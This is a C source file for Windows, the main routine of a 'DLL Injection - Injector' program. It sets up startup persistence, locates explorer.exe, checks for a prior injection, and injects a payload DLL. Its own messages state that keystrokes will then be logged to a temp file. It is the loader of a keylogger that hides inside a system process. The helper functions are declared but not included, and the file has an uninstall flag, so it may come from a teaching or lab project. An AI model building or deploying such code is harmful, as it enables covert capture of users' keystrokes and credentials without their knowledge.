#include <Windows.h>
#include <stdio.h>
#include "../Common/constants.h"

// Function declarations
DWORD FindProcessByName(const char* processName);
bool IsDLLAlreadyInjected(DWORD pid, const char* dllName);
bool InjectDLL(DWORD pid, const char* dllPath);
bool AddToStartup();
bool RemoveFromStartup();

int main(int argc, char* argv[]) {
    printf("======================================\n");
    printf("  DLL Injection - Injector\n");
    printf("======================================\n\n");

    // Check for uninstall flag
    if (argc > 1 && _stricmp(argv[1], "--uninstall") == 0) {
        printf("[*] Uninstall mode requested\n");
        RemoveFromStartup();
        printf("[*] To remove the payload, restart explorer.exe\n");
        return 0;
    }

    // Step 1: Add to startup for persistence
    printf("[Phase 1/4] Setting up persistence\n");
    if (!AddToStartup()) {
        printf("[!] Warning: Failed to add persistence. Continuing anyway...\n");
    }

    // Step 2: Find target process (explorer.exe)
    printf("[Phase 2/4] Finding target process\n");
    DWORD targetPID = FindProcessByName(TARGET_PROCESS);
    if (targetPID == 0) {
        printf("[-] Cannot proceed without target process.\n");
        printf("[-] Make sure %s is running.\n", TARGET_PROCESS);
        return 1;
    }

    // Step 3: Check if DLL is already injected (prevent double-injection)
    printf("[Phase 3/4] Checking for existing injection\n");
    if (IsDLLAlreadyInjected(targetPID, PAYLOAD_DLL_NAME)) {
        printf("[*] Payload is already injected. Exiting.\n");
        printf("[*] (This prevents double-injection)\n");
        return 0;
    }
    printf("[*] DLL not found in target process. Proceeding with injection.\n");

    // Step 4: Prepare DLL path (must be absolute path)
    printf("\n[Phase 4/4] Preparing DLL injection\n");

    // Get directory of current executable
    char exePath[MAX_PATH];
    DWORD pathLen = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (pathLen == 0 || pathLen >= MAX_PATH) {
        printf("[-] Failed to get executable path. Error: %lu\n", GetLastError());
        return 1;
    }

    // Remove executable name to get directory
    char* lastSlash = strrchr(exePath, '\\');
    if (lastSlash) {
        *lastSlash = '\0';
    }

    // Check combined path length before concatenation (prevent buffer overflow)
    // Need: exePath + '\\' + PAYLOAD_DLL_NAME + '\0'
    size_t exeDirLen = strlen(exePath);
    size_t dllNameLen = strlen(PAYLOAD_DLL_NAME);
    if (exeDirLen + 1 + dllNameLen + 1 > MAX_PATH) {
        printf("[-] Error: Combined path exceeds MAX_PATH limit!\n");
        printf("[-] Move the injector to a shorter path.\n");
        return 1;
    }

    // Construct full DLL path (assuming payload.dll is in same directory)
    char dllPath[MAX_PATH];
    sprintf_s(dllPath, MAX_PATH, "%s\\%s", exePath, PAYLOAD_DLL_NAME);

    printf("[*] Expected DLL location: %s\n", dllPath);

    // Verify DLL exists
    DWORD fileAttr = GetFileAttributesA(dllPath);
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Error: DLL file not found!\n");
        printf("[-] Make sure %s is in the same directory as injector.exe\n", PAYLOAD_DLL_NAME);
        return 1;
    }

    // Perform injection
    if (!InjectDLL(targetPID, dllPath)) {
        printf("[-] DLL injection failed!\n");
        return 1;
    }

    // Success - display log path location
    char tempPath[MAX_PATH];
    char logPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) > 0) {
        sprintf_s(logPath, MAX_PATH, "%s%s", tempPath, LOG_FILE_NAME);
    } else {
        sprintf_s(logPath, MAX_PATH, "%%TEMP%%\\%s", LOG_FILE_NAME);
    }

    printf("======================================\n");
    printf("[+] All tasks completed successfully!\n");
    printf("======================================\n\n");
    printf("[*] The payload is now running inside %s\n", TARGET_PROCESS);
    printf("[*] Keystrokes will be logged to: %s\n", logPath);
    printf("[*] This injector will now exit.\n");
    printf("[*] The payload will continue running in the background.\n\n");
    printf("[*] To uninstall: Run with --uninstall flag\n");
    printf("[*] To verify: Use Process Explorer to check DLLs in %s\n\n", TARGET_PROCESS);

    return 0;
}
